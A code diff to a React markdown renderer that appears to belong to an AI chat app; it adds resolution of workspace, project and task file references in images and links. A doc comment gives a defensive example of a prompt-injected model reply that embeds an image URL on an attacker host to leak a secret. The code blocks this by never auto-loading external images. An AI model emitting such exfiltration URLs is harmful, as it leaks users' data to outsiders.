@@ -8,7 +8,8 @@ import { Copy, Check } from 'lucide-react';
 import { formatTimestamp, formatNumber } from '../utils/formatters';
 import { getModelDisplayName } from '../constants/models';
 import { API_BASE_URL } from '../api/config';
-import { conversationSource, fileDownloadUrl, projectSource } from '../api/fileApi';
+import { conversationSource, fileDownloadUrl, projectSource, taskSource, type FileSource } from '../api/fileApi';
+import { isWorkspaceRef, parseWorkspaceRef, type WorkspaceRef } from '../utils/workspaceRefs';
 import type { MessageContent, ToolUseMessage as ToolUseMessageType, ToolResultMessage as ToolResultMessageType, StatsMessage as StatsMessageType, ErrorMessage as ErrorMessageType, InterruptedMessage as InterruptedMessageType, ActionRequestMessage as ActionRequestMessageType, ConnectRequestMessage as ConnectRequestMessageType, CompactionMessage as CompactionMessageType, ModelFallbackMessage as ModelFallbackMessageType, RoutineNudgeMessage as RoutineNudgeMessageType, ComposerAttachmentRef } from '../api/types';
 import { ToolUseMessage } from './ToolUseMessage';
 import { ActionRequestMessage } from './ActionRequestMessage';
@@ -158,34 +159,56 @@ export function CopyableTable({ children, ...props }: React.HTMLAttributes<HTMLT
 }
 
 /**
- * Context giving the shared markdown renderer the conversation whose
- * workspace image paths (`![alt](chart.png)`) should resolve against, plus
- * an optional click-to-enlarge handler. A context (rather than a
- * components-factory taking conversationId) keeps `markdownComponents` a
- * stable module constant, so the React.memo on MessageContentRenderer
- * still holds.
+ * Context giving the shared markdown renderer the file spaces its
+ * references resolve against, plus an optional click-to-open handler. A
+ * context (rather than a components-factory taking conversationId) keeps
+ * `markdownComponents` a stable module constant, so the React.memo on
+ * MessageContentRenderer still holds.
+ *
+ * Two kinds of reference resolve to a space's cookie-authed files/download
+ * route:
+ * - a bare relative path (`![alt](chart.png)`, `[r](reports/q3.pdf)`)
+ *   resolves against the host's own space: `conversationId`, else
+ *   `projectId`, else `taskId` (one is set by the FileViewerModal .md
+ *   preview of a Project files / Task files entry);
+ * - a space reference in the file tools' grammar (utils/workspaceRefs.ts)
+ *   resolves against its own id: `chat://` against `conversationId`,
+ *   `proj://` against `projectId`, `task://` against `taskId`. Without that
+ *   id it resolves nothing: the link keeps its href as written, the image
+ *   shows as a missing ref and is never fetched.
  *
  * `assetBase` switches image resolution to a Quest Doc's asset store (the
  * doc viewer sets it to `docAssetBase(docId)`): `assets/<name>` maps to
- * `<assetBase>/<name>`, every other relative src is a missing ref, and
- * `conversationId` is ignored. Link hrefs of the `assets/<name>` form
- * resolve the same way (other hrefs are untouched).
+ * `<assetBase>/<name>`, every other relative src is a missing ref, and the
+ * space ids are ignored. Link hrefs of the `assets/<name>` form resolve the
+ * same way (other hrefs are untouched).
  *
- * Outside a doc, a relative link href is a workspace path too: its href
- * becomes the files/download URL of the same space as images, and a plain
- * click hands the path to `onOpenFile` (the host's in-app viewer) when set.
+ * A resolved link's href is the download URL (copy-link and modifier
+ * clicks still work), and a plain click -- like a click on a resolved
+ * image -- hands the path and its space to `onOpenFile` (the host's in-app
+ * viewer) when set.
  */
 export interface MarkdownWorkspaceContextValue {
+  /** The conversation workspace: bare paths and `chat://` refs. */
   conversationId?: string;
   /**
-   * Resolve bare paths against a project's shared workspace instead (the
-   * FileViewerModal .md preview of a Project Files entry). Ignored when
-   * `assetBase` or `conversationId` is set; chat never sets it.
+   * A project's shared workspace: `proj://` refs, and bare paths when no
+   * `conversationId` is set (the FileViewerModal .md preview of a Project
+   * Files entry). A project conversation sets it beside `conversationId`.
    */
   projectId?: string;
+  /**
+   * A task's workspace: `task://` refs, and bare paths when neither
+   * `conversationId` nor `projectId` is set (the .md preview of a Task files
+   * entry). A task run's markdown sets it beside the run's `conversationId`.
+   */
+  taskId?: string;
   assetBase?: string;
-  /** Open a workspace file in the host's viewer: inline images on click, relative links on a plain click. */
-  onOpenFile?: (workspacePath: string, filename: string) => void;
+  /**
+   * Open a workspace file in the host's viewer: inline images on click,
+   * resolved links on a plain click. `source` is the space the path is in.
+   */
+  onOpenFile?: (workspacePath: string, filename: string, source: FileSource) => void;
 }
 
 export const MarkdownWorkspaceContext = React.createContext<MarkdownWorkspaceContextValue>({});
@@ -221,67 +244,137 @@ function docAssetUrl(path: string, assetBase: string): string | null {
   return asset ? `${assetBase}/${encodeURIComponent(asset[1])}` : null;
 }
 
+/** The space a bare relative path resolves against (see the context doc). */
+function bareSource(ctx: MarkdownWorkspaceContextValue): FileSource | null {
+  if (ctx.conversationId) return conversationSource(ctx.conversationId);
+  if (ctx.projectId) return projectSource(ctx.projectId);
+  if (ctx.taskId) return taskSource(ctx.taskId);
+  return null;
+}
+
+/** The space a `chat://` / `proj://` / `task://` reference names, when the context knows its id. */
+function refSource(ref: WorkspaceRef, ctx: MarkdownWorkspaceContextValue): FileSource | null {
+  switch (ref.scheme) {
+    case 'chat':
+      return ctx.conversationId ? conversationSource(ctx.conversationId) : null;
+    case 'proj':
+      return ctx.projectId ? projectSource(ctx.projectId) : null;
+    case 'task':
+      return ctx.taskId ? taskSource(ctx.taskId) : null;
+  }
+}
+
+/** A reference resolved to a file of some space. */
+interface ResolvedWorkspaceFile {
+  source: FileSource;
+  path: string;
+}
+
 /**
- * Markdown `img` renderer: workspace-relative srcs are rewritten to the
- * cookie-authed files/download endpoint of the surrounding conversation,
- * so the model can embed workspace images inline with plain markdown.
- * Inside a doc (`assetBase` set) only `assets/<name>` srcs resolve, to the
- * doc's cookie-authed asset route.
+ * Resolve a link href or image src outside a doc: a space reference
+ * against its own id, a bare relative path against the host's space.
+ * `unresolved` is a space reference whose id the context lacks; `external`
+ * an absolute URL (or `#anchor` for links); `none` a bare path with no space.
+ */
+function resolveWorkspaceFile(
+  ref: string,
+  ctx: MarkdownWorkspaceContextValue,
+): ResolvedWorkspaceFile | 'unresolved' | 'external' | 'none' {
+  const spaceRef = parseWorkspaceRef(ref);
+  if (spaceRef) {
+    const source = refSource(spaceRef, ctx);
+    return source && spaceRef.path ? { source, path: spaceRef.path } : 'unresolved';
+  }
+  if (EXTERNAL_SRC_RE.test(ref)) return 'external';
+  const source = bareSource(ctx);
+  const path = normalizeMarkdownPath(ref);
+  return source && path ? { source, path } : 'none';
+}
+
+function fileName(path: string): string {
+  return path.split('/').pop() || path;
+}
+
+/**
+ * Markdown `img` renderer: workspace-relative srcs and space references
+ * (`task://chart.png`) are rewritten to the cookie-authed files/download
+ * endpoint of their space (MarkdownWorkspaceContext), so the model can
+ * embed workspace images inline with plain markdown. Inside a doc
+ * (`assetBase` set) only `assets/<name>` srcs resolve, to the doc's
+ * cookie-authed asset route.
  *
  * External srcs are NEVER auto-fetched: an `<img>` fires its request the
  * moment the transcript renders, so a prompt-injected reply embedding
  * `https://attacker.example/p.png?<secret>` would exfiltrate data with no
  * user interaction. They degrade to a plain click-through link instead
  * (the same user-initiated exposure ordinary markdown links already have).
+ * Workspace routes are same-origin and the user's own, so loading those is
+ * safe; a space reference the context cannot resolve is a missing ref.
  */
 function MarkdownImage({ src, alt }: React.ImgHTMLAttributes<HTMLImageElement>) {
-  const { conversationId, projectId, assetBase, onOpenFile } = React.useContext(MarkdownWorkspaceContext);
+  const ctx = React.useContext(MarkdownWorkspaceContext);
+  const { assetBase, onOpenFile } = ctx;
   // Track the failing URL rather than a boolean: during streaming an image
   // ref can render with a truncated src that 404s, then re-render complete.
   const [failedSrc, setFailedSrc] = useState<string | null>(null);
 
   if (!src || typeof src !== 'string') return null;
 
-  if (EXTERNAL_SRC_RE.test(src)) {
-    return (
-      <a href={src} target="_blank" rel="noopener noreferrer" className="markdown-image-external">
-        {alt || src}
-      </a>
-    );
-  }
-
-  // Decoded here, re-encoded as a query param / path segment below.
-  const path = normalizeMarkdownPath(src);
-
   let url: string | null = null;
+  let file: ResolvedWorkspaceFile | null = null;
+  let label: string;
   if (assetBase) {
-    url = docAssetUrl(path, assetBase);
-  } else if (conversationId) {
-    url = fileDownloadUrl(conversationSource(conversationId), path);
-  } else if (projectId) {
-    url = fileDownloadUrl(projectSource(projectId), path);
+    // A doc resolves no space references: they show as missing refs.
+    if (isWorkspaceRef(src)) {
+      label = src;
+    } else if (EXTERNAL_SRC_RE.test(src)) {
+      return <ExternalImageLink src={src} alt={alt} />;
+    } else {
+      label = normalizeMarkdownPath(src);
+      url = docAssetUrl(label, assetBase);
+    }
+  } else {
+    const resolved = resolveWorkspaceFile(src, ctx);
+    if (resolved === 'external') return <ExternalImageLink src={src} alt={alt} />;
+    if (typeof resolved === 'object') {
+      file = resolved;
+      label = resolved.path;
+      url = fileDownloadUrl(resolved.source, resolved.path);
+    } else {
+      label = resolved === 'unresolved' ? src : normalizeMarkdownPath(src);
+    }
   }
 
   if (!url || failedSrc === url) {
     return (
-      <code className="markdown-image-missing" title={path}>
-        {alt || path}
+      <code className="markdown-image-missing" title={label}>
+        {alt || label}
       </code>
     );
   }
 
   const img = <img src={url} alt={alt || ''} loading="lazy" onError={() => setFailedSrc(url)} />;
-  if (!onOpenFile) return img;
-  const filename = path.split('/').pop() || path;
+  if (!onOpenFile || !file) return img;
+  const { source, path } = file;
+  const filename = fileName(path);
   return (
     <button
       type="button"
       className="markdown-image-button"
-      onClick={() => onOpenFile(path, filename)}
+      onClick={() => onOpenFile(path, filename, source)}
       title={`Open ${filename}`}
     >
       {img}
     </button>
+  );
+}
+
+/** An external image src, shown as a click-through link instead of loaded. */
+function ExternalImageLink({ src, alt }: { src: string; alt?: string }) {
+  return (
+    <a href={src} target="_blank" rel="noopener noreferrer" className="markdown-image-external">
+      {alt || src}
+    </a>
   );
 }
 
@@ -292,34 +385,32 @@ function MarkdownImage({ src, alt }: React.ImgHTMLAttributes<HTMLImageElement>) 
  * rule as images; every other href is left as written.
  *
  * Outside a doc, a relative href (`[note](note.txt)`, `[r](reports/q3.pdf)`)
- * is a workspace path, resolved like image srcs: the href becomes the
- * cookie-authed files/download URL so copy-link and modifier-clicks still
+ * and a space reference (`[notes](task://notes.md)`) are workspace paths,
+ * resolved like image srcs: the href becomes the cookie-authed
+ * files/download URL of their space so copy-link and modifier-clicks still
  * work, and a plain click opens the file through `onOpenFile` instead of a
- * new tab when the host provides it. Absolute URLs and `#anchors` are left
- * alone.
+ * new tab when the host provides it. Absolute URLs, `#anchors` and space
+ * references the context cannot resolve are left alone.
  */
 function MarkdownLink({ children, href, ...props }: React.AnchorHTMLAttributes<HTMLAnchorElement>) {
-  const { conversationId, projectId, assetBase, onOpenFile } = React.useContext(MarkdownWorkspaceContext);
+  const ctx = React.useContext(MarkdownWorkspaceContext);
+  const { assetBase, onOpenFile } = ctx;
   let resolved = href;
   let onClick: React.MouseEventHandler<HTMLAnchorElement> | undefined;
-  if (typeof href === 'string' && href && !EXTERNAL_SRC_RE.test(href) && !href.startsWith('#')) {
-    const path = normalizeMarkdownPath(href);
+  if (typeof href === 'string' && href && !href.startsWith('#')) {
     if (assetBase) {
-      resolved = docAssetUrl(path, assetBase) ?? href;
+      if (!EXTERNAL_SRC_RE.test(href)) resolved = docAssetUrl(normalizeMarkdownPath(href), assetBase) ?? href;
     } else {
-      const source = conversationId
-        ? conversationSource(conversationId)
-        : projectId
-          ? projectSource(projectId)
-          : null;
-      if (source && path) {
+      const file = resolveWorkspaceFile(href, ctx);
+      if (typeof file === 'object') {
+        const { source, path } = file;
         resolved = fileDownloadUrl(source, path);
         if (onOpenFile) {
           onClick = (e) => {
             // Modifier / middle clicks keep the browser's own new-tab behaviour.
             if (e.button !== 0 || e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) return;
             e.preventDefault();
-            onOpenFile(path, path.split('/').pop() || path);
+            onOpenFile(path, fileName(path), source);
           };
         }
       }
